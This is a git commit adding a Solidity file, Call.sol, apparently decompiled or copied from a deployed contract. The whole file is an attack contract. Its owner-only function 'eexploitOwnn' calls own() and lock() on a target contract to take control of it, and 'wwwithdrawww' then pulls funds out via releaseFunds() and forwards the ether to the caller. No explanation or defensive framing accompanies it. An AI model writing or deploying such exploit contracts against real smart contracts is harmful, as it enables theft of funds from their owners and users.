ac8ae891fd6f373ac05f3f72919a74360b62ce5b
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-17 10:01:38 +0700

    add contract Call

---
+++ Call.sol
@@ -0,0 +1,47 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Call at 0x0531c928d539cbee3aa3bb3dae37ad507c750efc
+*/
+pragma solidity ^0.4.24;
+contract HelloEx{
+
+	function own(address owner) {}
+
+	function releaseFunds(uint amount) {}
+
+	function lock() {}
+}
+
+contract Call{
+
+	address owner;
+
+	HelloEx contr;
+
+	constructor() public
+	{
+		owner = msg.sender;
+	}
+
+	function setMyContractt(address addr) public
+	{
+		require(owner==msg.sender);
+		contr = HelloEx(addr);
+	}
+
+	function eexploitOwnn() payable public
+	{
+		require(owner==msg.sender);
+		contr.own(address(this));
+		contr.lock();
+	}
+
+	function wwwithdrawww(uint amount) public
+	{
+		require(owner==msg.sender);
+		contr.releaseFunds(amount);
+		msg.sender.transfer(amount * (1 ether));
+	}
+
+	function () payable public
+	{}
+}
